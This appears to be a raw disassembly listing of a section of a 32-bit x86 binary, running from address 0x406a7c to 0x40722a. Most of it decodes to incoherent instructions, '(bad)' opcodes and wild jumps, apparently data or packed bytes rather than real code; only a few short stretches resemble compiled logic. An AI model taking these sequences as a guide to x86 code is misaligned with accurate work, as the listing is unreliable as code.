  406a7c:	pop    edx
  406a7d:	xchg   ebx,eax
  406a7e:	data16 sbb al,0x30
  406a81:	dec    ebp
  406a82:	iret   
  406a83:	mov    edi,0xf8f34dca
  406a88:	mov    DWORD PTR [edx+edi*8-0x65ed78d],ebp
  406a8f:	aaa    
  406a90:	retf   
  406a91:	jbe    0x406ae7
  406a93:	inc    edi
  406a94:	or     dl,BYTE PTR [eax+edi*1-0x71]
  406a98:	retf   
  406a99:	inc    ebx
  406a9a:	jbe    0x406ac3
  406a9c:	mov    bl,0x37
  406a9e:	int3   
  406a9f:	out    dx,eax
  406aa0:	cli    
  406aa1:	xchg   ecx,eax
  406aa2:	mov    dh,0xb6
  406aa4:	neg    BYTE PTR [ebx-0xa61c045]
  406aaa:	ins    DWORD PTR es:[edi],dx
  406aab:	or     edi,ebx
  406aad:	fs xchg ebp,eax
  406aaf:	sar    BYTE PTR [ecx+0x3a],0x7b
  406ab3:	scas   al,BYTE PTR es:[edi]
  406ab4:	add    DWORD PTR [edi],0x7ffc89e3
  406aba:	fisub  WORD PTR [ecx]
  406abc:	sbb    eax,0x7ffa7bc5
  406ac1:	sbb    ebp,DWORD PTR [edx]
  406ac3:	sub    eax,0xde8c3b0f
  406ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac9:	inc    esi
  406aca:	or     al,0xe1
  406acc:	jbe    0x406a79
  406ace:	cmc    
  406acf:	dec    ecx
  406ad0:	(bad)  
  406ad2:	xlat   BYTE PTR ds:[ebx]
  406ad3:	mov    bh,0x68
  406ad5:	xor    eax,0x9f5d6a5f
  406ada:	sub    dh,BYTE PTR [edx+0x6a]
  406add:	jnp    0x406aef
  406adf:	popa   
  406ae0:	add    DWORD PTR [ecx],0x5d
  406ae3:	push   ebx
  406ae4:	test   al,0x90
  406ae6:	int    0x4b
  406ae8:	adc    al,0xfe
  406aea:	mov    ecx,fs
  406aec:	or     edx,DWORD PTR [ebx-0x33]
  406aef:	fs scas eax,DWORD PTR es:[edi]
  406af1:	mov    eax,0xc721257b
  406af6:	or     ebp,DWORD PTR [eax+0x5e]
  406af9:	icebp  
  406afa:	mov    ds:0x143c4855,al
  406aff:	pusha  
  406b00:	dec    ebx
  406b01:	xchg   esp,eax
  406b02:	pushf  
  406b03:	inc    esp
  406b04:	daa    
  406b05:	(bad)  
  406b06:	jl     0x406b14
  406b08:	out    0xc0,al
  406b0a:	(bad)  
  406b0b:	in     eax,dx
  406b0c:	(bad)
  406b0f:	xor    bh,bh
  406b11:	fstp   QWORD PTR [esp+esi*1]
  406b14:	fnsave [ebx]
  406b16:	gs inc esi
  406b18:	dec    esi
  406b19:	inc    eax
  406b1a:	push   eax
  406b1b:	(bad)  
  406b1c:	fwait
  406b1d:	in     al,dx
  406b1e:	(bad)  
  406b1f:	test   DWORD PTR [esi-0x413ec8a7],ebx
  406b25:	fistp  WORD PTR [esp+ecx*1-0x459fada9]
  406b2c:	or     ah,dl
  406b2e:	retf   
  406b2f:	mov    bl,0xfc
  406b31:	mul    BYTE PTR [ebx+0x238a7847]
  406b37:	shl    DWORD PTR [ebx-0x6fb54063],0xf0
  406b3e:	imul   esp
  406b40:	and    dh,dl
  406b42:	dec    edi
  406b43:	pop    esp
  406b44:	xchg   edx,eax
  406b45:	mov    es,WORD PTR [ebp-0x186580ee]
  406b4b:	adc    eax,0xc8288839
  406b50:	inc    edi
  406b51:	and    eax,0x78cd5915
  406b56:	mov    al,ds:0xe0719d4c
  406b5b:	inc    ebx
  406b5c:	bsf    edi,ecx
  406b5f:	(bad)  
  406b60:	clc    
  406b61:	sub    al,0x6b
  406b63:	sahf   
  406b64:	loope  0x406b95
  406b66:	pushf  
  406b67:	mov    dl,BYTE PTR [edi+0x8]
  406b6a:	not    DWORD PTR [esi-0x4cb6bd48]
  406b70:	jmp    0xf09c1aa2
  406b75:	retf   
  406b76:	retf   0x39d9
  406b79:	dec    edi
  406b7a:	or     ebx,DWORD PTR [esp+edi*1]
  406b7d:	xchg   DWORD PTR [ebp+0x7a],eax
  406b80:	xchg   ecx,eax
  406b81:	pop    es
  406b82:	mov    cr6,edx
  406b85:	sub    edx,ebx
  406b87:	mov    eax,0xf0a22e63
  406b8c:	cmp    cl,BYTE PTR [esi-0x54]
  406b8f:	pop    esp
  406b90:	dec    edx
  406b91:	dec    esi
  406b92:	mov    ecx,0x3e142641
  406b97:	or     al,0x17
  406b9a:	int3   
  406b9b:	(bad)  
  406b9c:	(bad)
  406b9f:	xor    eax,0x3590ef1b
  406ba4:	xor    eax,0x5b15a17b
  406ba9:	mov    WORD PTR [ecx],?
  406bab:	(bad)  
  406bac:	adc    bl,al
  406bae:	aaa    
  406baf:	mov    ch,0xd0
  406bb1:	lea    ecx,[edx+0x46]
  406bb4:	xchg   esp,eax
  406bb5:	push   ecx
  406bb6:	aam    0x97
  406bb8:	mov    bl,0x76
  406bba:	scas   eax,DWORD PTR es:[edi]
  406bbb:	imul   edi,DWORD PTR [ebx-0x752603c2],0x11
  406bc2:	imul   esp,edx,0xcbb6ad37
  406bc8:	dec    ecx
  406bc9:	mov    ah,0xd4
  406bcb:	push   ds
  406bcc:	aaa    
  406bcd:	popa   
  406bce:	idiv   eax
  406bd0:	ret    
  406bd1:	and    bh,BYTE PTR [edx-0x58]
  406bd4:	mov    ebx,0x33eb071
  406bd9:	enter  0x65ee,0xf3
  406bdd:	pushf  
  406bde:	add    BYTE PTR [ebx],ch
  406be0:	cmc    
  406be1:	icebp  
  406be2:	enter  0xbbb7,0x56
  406be6:	pop    edi
  406be7:	div    DWORD PTR [ecx-0x47]
  406bea:	jle    0x406c2b
  406bec:	(bad)  
  406bed:	pop    es
  406bee:	and    DWORD PTR [edx],edx
  406bf0:	mov    esp,0x50d91a9a
  406bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bf6:	push   eax
  406bf7:	pop    ecx
  406bf8:	xchg   esp,eax
  406bf9:	fild   WORD PTR [edx-0x1cfd05ae]
  406bff:	inc    eax
  406c00:	test   al,0xcd
  406c02:	stos   BYTE PTR es:[edi],al
  406c03:	loopne 0x406c80
  406c05:	inc    eax
  406c06:	dec    eax
  406c07:	jge    0x406c4f
  406c09:	mov    ah,ah
  406c0b:	and    al,0x84
  406c0d:	pop    ebx
  406c0e:	add    BYTE PTR [edi],al
  406c10:	jmp    0x6b975768
  406c15:	sbb    al,0x7e
  406c17:	in     eax,0x17
  406c19:	jmp    0x406c5b
  406c1b:	and    eax,0xd570d7b4
  406c20:	add    al,0xab
  406c22:	mov    esp,0x9d1af5e1
  406c27:	sub    bl,al
  406c29:	push   edi
  406c2a:	dec    ebp
  406c2b:	lods   al,BYTE PTR ds:[esi]
  406c2c:	or     al,0x78
  406c2e:	lods   eax,DWORD PTR ds:[esi]
  406c2f:	sub    DWORD PTR [ebx],ebx
  406c31:	out    0x2c,eax
  406c33:	pusha  
  406c34:	xchg   ebp,eax
  406c35:	pusha  
  406c36:	dec    edi
  406c37:	xor    ah,BYTE PTR [eax+0x39]
  406c3a:	push   esp
  406c3b:	push   eax
  406c3c:	pop    esi
  406c3d:	loop   0x406ca8
  406c3f:	loopne 0x406bed
  406c41:	hlt    
  406c42:	dec    edx
  406c43:	in     al,dx
  406c44:	cli    
  406c45:	lds    ebx,FWORD PTR [eax]
  406c47:	and    ch,dl
  406c49:	adc    DWORD PTR [ebp+esi*4-0x39],ebp
  406c4d:	mov    eax,0x1dea5f76
  406c52:	cmp    BYTE PTR [ebx],0x21
  406c55:	cmp    ebp,DWORD PTR [ebx-0x3fca3337]
  406c5b:	sbb    al,0xb
  406c5d:	ss jne 0x406cb0
  406c60:	xlat   BYTE PTR ds:[ebx]
  406c61:	adc    BYTE PTR [ebp+0x0],0x47
  406c65:	jo     0x406c9a
  406c67:	mov    eax,0xee52333d
  406c6c:	xchg   edi,eax
  406c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c6e:	data16 jecxz 0x406bfd
  406c71:	loopne 0x406cc2
  406c73:	pop    ss
  406c74:	fbld   TBYTE PTR [ebp+0xb]
  406c77:	out    0xb8,al
  406c79:	loop   0x406cbb
  406c7b:	sbb    DWORD PTR ds:0xe3422f70,edx
  406c81:	das    
  406c82:	les    esi,FWORD PTR [esi+0x6a]
  406c85:	enter  0xb8a9,0xdc
  406c89:	loope  0x406c89
  406c8b:	xor    BYTE PTR [esi+0x20],0xc1
  406c8f:	pop    esp
  406c90:	inc    edx
  406c91:	(bad)  
  406c92:	mov    edx,DWORD PTR [esi-0x15aafe7e]
  406c98:	xchg   esp,eax
  406c99:	(bad)  
  406c9b:	or     BYTE PTR [ebp+ebx*8-0x1f],ah
  406c9f:	rcl    DWORD PTR [edx+0x57],cl
  406ca2:	lods   al,BYTE PTR ds:[esi]
  406ca3:	pop    edi
  406ca4:	pop    ebp
  406ca5:	push   esp
  406ca6:	(bad)  
  406ca7:	sbb    bl,BYTE PTR [edx+0x5a710a8d]
  406cad:	(bad)  
  406caf:	ins    DWORD PTR es:[edi],dx
  406cb0:	push   ebp
  406cb1:	sti    
  406cb2:	sahf   
  406cb3:	mov    ecx,0xbddb62ef
  406cb8:	add    DWORD PTR [ebx],ebp
  406cba:	xor    eax,0x20aaa179
  406cbf:	xor    bh,BYTE PTR [ebp-0x41132ad4]
  406cc5:	ja     0x406d1a
  406cc7:	outs   dx,BYTE PTR ds:[esi]
  406cc8:	out    0xf5,eax
  406cca:	jl     0x406ccb
  406ccc:	jne    0x406cc2
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0xb2ed985
  406cf4:	dec    ecx
  406cf5:	fmulp  st(3),st
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406c88
  406cff:	(bad)  
  406d01:	fs hlt 
  406d03:	mov    esi,0x4ab70560
  406d08:	adc    al,0x1d
  406d0a:	add    DWORD PTR [esi-0x72],esi
  406d0d:	or     al,0x1c
  406d0f:	call   0x93c4:0x89027085
  406d16:	cmp    ebp,DWORD PTR [esp+ecx*1-0x55b0a18]
  406d1d:	mov    ecx,0x300be53f
  406d22:	addr16 jne 0x406d7b
  406d25:	cmp    ebp,DWORD PTR [eax+0x3dfa9707]
  406d2b:	cmp    ebx,DWORD PTR [ecx+edi*4]
  406d2e:	test   esp,esp
  406d30:	loope  0x406cdf
  406d32:	push   ds
  406d33:	ja     0x406d09
  406d35:	test   BYTE PTR [edi],bl
  406d37:	imul   esi,DWORD PTR [esi+0x452d5b5],0xffffffbf
  406d3e:	push   ds
  406d3f:	mov    bl,0x75
  406d41:	daa    
  406d42:	std    
  406d43:	hlt    
  406d44:	inc    ecx
  406d45:	(bad)  
  406d46:	mov    DWORD PTR [esi-0x21],0xed37cf15
  406d4d:	or     edi,DWORD PTR [ecx+0x14954aad]
  406d53:	push   0x6cc11efd
  406d58:	aam    0xee
  406d5a:	xchg   esi,eax
  406d5b:	in     al,0x6f
  406d5d:	mov    es:0xc66d7ce9,eax
  406d63:	pop    esi
  406d64:	sub    al,0x41
  406d66:	fsub   QWORD PTR [ebp+edx*1+0x54]
  406d6a:	mov    al,0x9c
  406d6c:	fiadd  WORD PTR [esi-0x29b23299]
  406d72:	and    eax,DWORD PTR [edi]
  406d74:	in     eax,dx
  406d75:	sahf   
  406d76:	cmp    al,0xf9
  406d78:	popf   
  406d79:	push   eax
  406d7a:	add    BYTE PTR [ebx],al
  406d7c:	and    ecx,DWORD PTR [edx+0x1edaf9ce]
  406d82:	xor    BYTE PTR [eax+0x3],0x5d
  406d86:	pop    eax
  406d87:	stos   BYTE PTR es:[edi],al
  406d88:	pop    ss
  406d89:	jns    0x406d66
  406d8b:	pop    esi
  406d8c:	fdecstp 
  406d8e:	mov    esp,0xe5300fb2
  406d93:	adc    DWORD PTR [esi-0x727f4fa2],ebp
  406d99:	loop   0x406e10
  406d9b:	nop
  406d9c:	cs xchg di,ax
  406d9f:	dec    eax
  406da0:	mov    esi,0xb2100b91
  406da5:	fidivr DWORD PTR [esi]
  406da7:	retf   
  406da8:	or     al,0xda
  406daa:	jge    0x406d51
  406dac:	cmp    DWORD PTR [edx],ebp
  406dae:	jg     0x406d69
  406db0:	test   eax,0xfa887937
  406db5:	ret    
  406db6:	fdivr  st(5),st
  406db8:	xlat   BYTE PTR ds:[ebx]
  406db9:	cmp    edx,DWORD PTR [ebp-0x2c]
  406dbc:	and    cl,BYTE PTR ds:0x9b08a1ee
  406dc2:	dec    edx
  406dc3:	mov    bl,0x26
  406dc5:	push   ss
  406dc6:	sub    eax,0x40d5c1b0
  406dcb:	adc    BYTE PTR [edx-0x21],0x9c
  406dcf:	dec    ebp
  406dd0:	xchg   edx,eax
  406dd1:	dec    ebp
  406dd2:	js     0x406dd6
  406dd4:	xor    al,0x6d
  406dd6:	rcr    DWORD PTR [edx-0x5262d804],1
  406ddc:	push   edi
  406ddd:	sbb    BYTE PTR [esi-0x51f7a26],bh
  406de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406de5:	imul   eax,DWORD PTR [ecx+ebp*8],0xffffff95
  406de9:	ds in  eax,dx
  406deb:	sbb    DWORD PTR [eax*1+0x1aeb72a2],0x2d
  406df3:	xchg   ebp,eax
  406df4:	sub    DWORD PTR ds:0xe737ef73,esi
  406dfa:	jg     0x406e57
  406dfc:	out    0xf3,al
  406dfe:	rcl    DWORD PTR [edi+edi*1+0x32c6b724],cl
  406e05:	mov    ebx,0xed7e3705
  406e0a:	xchg   edx,eax
  406e0b:	sub    al,0xf8
  406e0d:	add    BYTE PTR [ebx+0x34ec0ff9],dl
  406e13:	call   0x7fc03832
  406e18:	std    
  406e19:	cmc    
  406e1a:	mov    BYTE PTR ds:[esp+eax*2],dh
  406e1e:	bt     DWORD PTR [edi+0x65d13ea6],edi
  406e25:	imul   esi,DWORD PTR [ecx-0x4c2ff2ba],0xffffffeb
  406e2c:	jmp    0x25d1516c
  406e31:	sub    al,0xea
  406e33:	dec    ebx
  406e34:	xchg   edi,eax
  406e35:	xchg   edi,eax
  406e36:	add    ebx,DWORD PTR [esp+eiz*4-0x3589d09]
  406e3d:	fdecstp 
  406e3f:	mov    ecx,0x91efd4ac
  406e44:	neg    DWORD PTR ds:0x1a898add
  406e4a:	sub    eax,DWORD PTR [esi]
  406e4c:	sbb    DWORD PTR [edi+0x358f7927],0x65f50584
  406e56:	clc    
  406e57:	repz out 0x3,al
  406e5a:	into   
  406e5b:	push   eax
  406e5c:	jmp    0x15dc:0x8dbb2db4
  406e63:	in     eax,dx
  406e64:	shr    edx,cl
  406e66:	xor    al,BYTE PTR [edx]
  406e68:	inc    esp
  406e69:	mov    bh,0x51
  406e6b:	adc    DWORD PTR [ebp+0x5a],ebp
  406e6e:	sbb    bh,BYTE PTR [eax]
  406e70:	lahf   
  406e71:	scas   al,BYTE PTR es:[edi]
  406e72:	aad    0xf5
  406e74:	adc    esi,edx
  406e76:	fwait
  406e77:	sub    eax,0x5e4f849c
  406e7c:	sub    al,0xc2
  406e7e:	pop    ecx
  406e7f:	(bad)  
  406e80:	ss xchg ecx,eax
  406e82:	ss test dh,al
  406e85:	rcr    DWORD PTR [esi-0x1deb1619],1
  406e8b:	mov    dl,0x76
  406e8d:	jno    0x406e80
  406e8f:	scas   eax,DWORD PTR es:[edi]
  406e90:	add    BYTE PTR [esi+0x55],al
  406e93:	(bad)
  406e96:	mov    bl,0xfe
  406e98:	aam    0xe1
  406e9a:	out    0x1e,eax
  406e9c:	and    BYTE PTR [esi],0x33
  406e9f:	inc    edx
  406ea0:	imul   eax,edi,0xfffffff0
  406ea3:	dec    edx
  406ea4:	pop    eax
  406ea5:	xor    eax,0xeec57c2b
  406eaa:	js     0x406f1e
  406eac:	(bad)  
  406ead:	test   al,0xc9
  406eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eb0:	in     eax,0x62
  406eb2:	adc    edi,ecx
  406eb4:	imul   eax,DWORD PTR [ecx-0x3],0xfc1de6d3
  406ebb:	push   edx
  406ebc:	jb     0x406eb5
  406ebe:	gs sub dh,dh
  406ec1:	je     0x406f35
  406ec3:	(bad)  
  406ec4:	mov    edi,0x838b7be6
  406ec9:	jecxz  0x406f2a
  406ecb:	fild   DWORD PTR [esi+0x7e]
  406ece:	cmp    BYTE PTR [esi+0x6e],al
  406ed1:	cdq    
  406ed2:	ja     0x406ee3
  406ed4:	imul   ebx,edx,0x680df8c3
  406eda:	jg     0x406ea7
  406edc:	popf   
  406edd:	adc    eax,0xa4a6e1c1
  406ee2:	imul   eax
  406ee4:	mov    ?,WORD PTR [eax]
  406ee6:	outs   dx,DWORD PTR ds:[esi]
  406ee7:	adc    al,0x5d
  406ee9:	imul   edi,esp,0xc4d6fd7c
  406eef:	fwait
  406ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ef1:	cmp    BYTE PTR [edi-0x1f],0xbb
  406ef5:	mov    bh,0x18
  406ef7:	xor    BYTE PTR [ebp-0x16467120],bh
  406efd:	push   cs
  406efe:	lock (bad) 
  406f00:	jmp    0x422688e1
  406f05:	cmp    eax,0x20613201
  406f0a:	sub    DWORD PTR [esi],0xfffffff9
  406f0d:	inc    ebp
  406f0e:	aad    0x5
  406f10:	xor    al,0x2d
  406f12:	or     edi,eax
  406f14:	test   DWORD PTR [edx-0x48de8831],edi
  406f1a:	imul   esp,esi,0x3b36874b
  406f20:	fcomp  QWORD PTR [ecx]
  406f22:	hlt    
  406f23:	jl     0x406f5d
  406f25:	inc    esi
  406f26:	add    BYTE PTR [eax],cl
  406f28:	call   0x5650:0x8314ad40
  406f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f30:	in     eax,0x0
  406f32:	sub    dl,bl
  406f34:	pop    esi
  406f35:	popa   
  406f36:	sbb    eax,0xfbb31f11
  406f3b:	xor    al,ah
  406f3d:	or     ah,BYTE PTR [ecx]
  406f3f:	sahf   
  406f40:	das    
  406f41:	scas   al,BYTE PTR es:[edi]
  406f42:	jbe    0x406f76
  406f44:	push   cs
  406f45:	xchg   ebp,eax
  406f46:	mov    ah,0xf1
  406f48:	in     al,0x23
  406f4a:	cdq    
  406f4b:	cwde   
  406f4c:	push   ss
  406f4d:	mov    bl,0xdf
  406f4f:	jmp    0x643ce9ba
  406f54:	es das 
  406f56:	dec    esi
  406f57:	push   ds
  406f58:	xchg   ch,dh
  406f5a:	jb     0x406fda
  406f5c:	push   ebx
  406f5d:	(bad)  
  406f5e:	sti    
  406f5f:	retf   0xcaf6
  406f62:	pop    edx
  406f63:	xchg   ebp,eax
  406f64:	mov    al,ds:0x42ae1744
  406f69:	sahf   
  406f6a:	retf   
  406f6b:	push   edi
  406f6c:	jne    0x406f06
  406f6e:	pop    edi
  406f6f:	add    dh,ah
  406f71:	mov    al,ds:0xc91642b9
  406f76:	adc    BYTE PTR ds:0x34215432,cl
  406f7c:	mul    BYTE PTR [eax]
  406f7e:	pop    esp
  406f7f:	mov    al,0x2e
  406f81:	pop    es
  406f82:	aas    
  406f83:	xchg   ebp,eax
  406f84:	scas   al,BYTE PTR es:[edi]
  406f85:	push   edx
  406f86:	jge    0x406f86
  406f88:	dec    ebx
  406f89:	ds popf 
  406f8b:	mov    ah,0xd1
  406f8d:	pop    eax
  406f8e:	call   0x1d2ccdac
  406f93:	xor    edi,0x33
  406f96:	mov    ah,0xaf
  406f98:	popf   
  406f99:	sbb    bh,ah
  406f9b:	cmp    edx,0xffffffad
  406f9e:	repz xchg esi,eax
  406fa0:	xor    BYTE PTR [edx+0xb64f222],cl
  406fa6:	xchg   esp,eax
  406fa7:	xchg   esi,eax
  406fa8:	mov    ah,0xd6
  406faa:	ins    BYTE PTR es:[edi],dx
  406fab:	push   eax
  406fac:	and    eax,0xcdc74a73
  406fb1:	pop    ebp
  406fb2:	push   0xffffffa5
  406fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fb5:	jno    0x40702f
  406fb7:	xchg   DWORD PTR [ebp+0x10fbe90e],eax
  406fbd:	imul   ebx,DWORD PTR [ebx-0x7efbca68],0x83427b29
  406fc7:	imul   ecx,DWORD PTR [edx],0xffffff87
  406fca:	sbb    di,WORD PTR [ebx-0x59fe7a90]
  406fd1:	test   BYTE PTR [ebx+0x4f],0xb0
  406fd5:	cmc    
  406fd6:	mov    ecx,0x46bade63
  406fdb:	in     al,dx
  406fdc:	shl    BYTE PTR [esp+esi*4],0x75
  406fe0:	and    al,0x19
  406fe2:	push   es
  406fe3:	js     0x40700e
  406fe5:	ret    0x17df
  406fe8:	out    dx,al
  406fe9:	loope  0x406f7a
  406feb:	scas   eax,DWORD PTR es:[edi]
  406fec:	cmp    ebp,DWORD PTR [edi+0x32]
  406fef:	mov    ecx,0xc3b86e82
  406ff4:	mov    al,0xcb
  406ff6:	aad    0xf8
  406ff8:	test   DWORD PTR [eax],0x9737427d
  406ffe:	lahf   
  406fff:	(bad)  
  407000:	repz ja 0x406fad
  407003:	aas    
  407004:	jbe    0x406fa0
  407006:	pop    esp
  407007:	jae    0x406f8a
  407009:	cmp    eax,DWORD PTR [edi+0x36432ff]
  40700f:	mov    ss,ebx
  407011:	popa   
  407012:	cli    
  407013:	stos   DWORD PTR es:[edi],eax
  407014:	je     0x407021
  407016:	repz or dh,BYTE PTR [edx-0x741d6414]
  40701d:	pushf  
  40701e:	hlt    
  40701f:	cmp    eax,0x21ed0de8
  407024:	dec    esi
  407025:	xor    eax,0x81fa04ce
  40702a:	sub    dl,BYTE PTR [esi-0x74afa507]
  407030:	inc    ebp
  407031:	in     al,dx
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0xb3d27149
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x40701a
  407061:	dec    esi
  407062:	xchg   esi,eax
  407063:	in     eax,dx
  407064:	(bad)  
  407065:	fld    QWORD PTR [edi]
  407067:	jae    0x407099
  407069:	(bad)  
  40706a:	fst    QWORD PTR [ebx+0x152df983]
  407070:	mov    dl,ah
  407072:	aam    0x60
  407074:	ror    BYTE PTR [ebx],1
  407076:	pushf  
  407077:	out    dx,al
  407078:	ins    BYTE PTR es:[edi],dx
  407079:	mov    ds:0x72425d2f,eax
  40707e:	(bad)  
  40707f:	out    0x39,al
  407081:	mov    ch,0x18
  407083:	xchg   ecx,eax
  407084:	mov    ds:0x7457c314,eax
  407089:	fstp   DWORD PTR [ebp+0x45d74cae]
  40708f:	test   al,0x2c
  407091:	les    edx,FWORD PTR ds:[ecx+0x5b891ac7]
  407098:	test   DWORD PTR [edi+edx*1],ebx
  40709b:	leave  
  40709c:	jl     0x407071
  40709e:	and    al,0xcf
  4070a0:	sub    ebp,ebx
  4070a2:	lds    eax,FWORD PTR [eax+0x7c]
  4070a5:	fidivr DWORD PTR [esi-0x77]
  4070a8:	sbb    ebx,esi
  4070aa:	mov    ds:0x82d12838,eax
  4070af:	clc    
  4070b0:	aas    
  4070b1:	repnz push ebp
  4070b3:	xchg   DWORD PTR [eax],ebx
  4070b5:	mov    bh,0x63
  4070b7:	push   ebp
  4070b8:	iret   
  4070b9:	jo     0x4070fd
  4070bb:	pop    esi
  4070bc:	shl    BYTE PTR [edi-0x5a],1
  4070bf:	aas    
  4070c0:	(bad)  
  4070c1:	mov    edx,0xb72c93f3
  4070c6:	fnstsw WORD PTR [edi]
  4070c8:	stos   BYTE PTR es:[edi],al
  4070c9:	sbb    esp,DWORD PTR [edi+0x5598f28b]
  4070cf:	lock data16 rol al,cl
  4070d3:	xchg   edx,eax
  4070d4:	jg     0x4070d2
  4070d6:	stos   DWORD PTR es:[edi],eax
  4070d7:	pop    eax
  4070d8:	inc    edi
  4070d9:	inc    ecx
  4070da:	clc    
  4070db:	push   esp
  4070dc:	lahf   
  4070dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070de:	dec    edi
  4070df:	popa   
  4070e0:	and    dh,BYTE PTR [ecx-0x9]
  4070e3:	ror    bl,cl
  4070e5:	jmp    0x43f583db
  4070ea:	and    edx,DWORD PTR [ecx-0x31]
  4070ed:	pop    edi
  4070ee:	xor    bl,BYTE PTR [ebp-0xb2d4f7c]
  4070f4:	push   eax
  4070f5:	ret    0x2045
  4070f8:	outs   dx,DWORD PTR ds:[esi]
  4070f9:	pop    ds
  4070fa:	lods   al,BYTE PTR ds:[esi]
  4070fb:	and    eax,0x56e0610a
  407100:	outs   dx,BYTE PTR ds:[esi]
  407101:	(bad)  
  407102:	dec    edi
  407103:	data16 icebp 
  407105:	dec    ebp
  407106:	aad    0x83
  407108:	or     dh,ch
  40710a:	adc    edx,ebp
  40710c:	bound  ebp,QWORD PTR cs:[ebx-0x7919cf63]
  407113:	push   edx
  407114:	or     al,0x73
  407116:	sar    BYTE PTR [edx+0x7afd5a60],cl
  40711c:	retf   0xb3c3
  40711f:	cmp    eax,0x230fd050
  407124:	or     eax,0x4ddf4cb2
  407129:	rcr    cl,1
  40712b:	rcl    DWORD PTR [ecx+0x48],0x28
  40712f:	fcom   DWORD PTR [esi-0x2ae919b0]
  407135:	je     0x40714d
  407137:	mov    esp,0x599c70b6
  40713c:	daa    
  40713d:	ins    BYTE PTR es:[edi],dx
  40713e:	shr    ah,0xdb
  407141:	addr16 stc 
  407143:	dec    esp
  407144:	cmp    al,0xf6
  407146:	add    al,0xcb
  407148:	int    0x64
  40714a:	inc    esp
  40714b:	jge    0x4070e6
  40714d:	xchg   edx,eax
  40714e:	aam    0x1d
  407150:	test   al,0x32
  407152:	out    0x9f,al
  407154:	in     al,dx
  407155:	sub    DWORD PTR [esi-0x58],eax
  407158:	mov    WORD PTR [edx-0x41fa9c2],cs
  40715e:	rcl    DWORD PTR [edx],cl
  407160:	fisttp WORD PTR [esi+0x27]
  407163:	bound  edi,QWORD PTR [edx-0x162991e0]
  407169:	ss stc 
  40716b:	mov    ch,0xf4
  40716d:	iret   
  40716e:	fild   WORD PTR [eax]
  407170:	pop    eax
  407171:	sti    
  407172:	bound  ebx,QWORD PTR [ecx+0x61ddd266]
  407178:	mov    eax,ds:0xb6dcfdfb
  40717d:	xchg   edi,eax
  40717e:	inc    eax
  40717f:	xchg   edi,eax
  407180:	and    eax,0xef036a88
  407185:	add    ch,BYTE PTR [ebp+0x28]
  407188:	pop    ss
  407189:	int3   
  40718a:	and    eax,0x96508e59
  40718f:	scas   al,BYTE PTR es:[edi]
  407190:	int3   
  407191:	(bad)  
  407192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407193:	int    0x61
  407195:	retf   
  407196:	push   ecx
  407197:	mov    ds:0x530d821c,al
  40719c:	or     al,0xca
  40719e:	inc    edx
  40719f:	xchg   edx,eax
  4071a0:	(bad)  
  4071a1:	jmp    0xcecb:0xcf26007f
  4071a8:	out    0xfb,al
  4071aa:	paddusw mm2,mm6
  4071ad:	sub    BYTE PTR [ecx-0x5c],ch
  4071b0:	sub    al,0x7b
  4071b2:	and    ebx,ebx
  4071b4:	dec    ebp
  4071b5:	and    dh,BYTE PTR [edx]
  4071b7:	in     al,dx
  4071b8:	pop    ecx
  4071b9:	sar    BYTE PTR [ecx+0x72],cl
  4071bc:	repnz bound edi,QWORD PTR [ecx+0x45]
  4071c0:	pop    edx
  4071c1:	imul   esp,DWORD PTR [ebx+0x3a5a69fc],0xffffff87
  4071c8:	add    al,0xd2
  4071ca:	dec    eax
  4071cb:	mov    bl,0x1b
  4071cd:	push   ds
  4071ce:	test   BYTE PTR [ebp+0x78c27b2f],cl
  4071d4:	loope  0x407225
  4071d6:	shl    BYTE PTR [ebx],0x32
  4071d9:	push   ds
  4071da:	xlat   BYTE PTR ds:[ebx]
  4071db:	clc    
  4071dc:	es ins DWORD PTR es:[edi],dx
  4071de:	mov    al,0x35
  4071e0:	xor    DWORD PTR [eax+esi*8+0x30],edi
  4071e4:	xor    al,0x83
  4071e6:	idiv   DWORD PTR [ebp-0x6c]
  4071e9:	out    dx,eax
  4071ea:	push   ds
  4071eb:	fidiv  WORD PTR [ebx+edx*2+0x17e39db]
  4071f2:	std    
  4071f3:	call   0xf2fb9f68
  4071f8:	cmp    cl,bl
  4071fa:	inc    eax
  4071fb:	dec    ecx
  4071fc:	call   0xcc0668b5
  407201:	sub    DWORD PTR [edi],eax
  407203:	dec    ecx
  407204:	mov    ebp,DWORD PTR [edx]
  407206:	add    BYTE PTR [ecx],ah
  407208:	shl    esi,0xc6
  40720b:	adc    eax,0x50d9bbdb
  407210:	add    BYTE PTR [esp+edi*2+0x718b1c44],al
  407217:	je     0x4071ae
  407219:	repnz mov ds:0xf1b56662,eax
  40721f:	fdiv   DWORD PTR fs:[esi-0x4d638ef8]
  407226:	cmp    BYTE PTR [ebp+0x5d],bl
  407229:	cdq    
  40722a:	jg     0x40722e
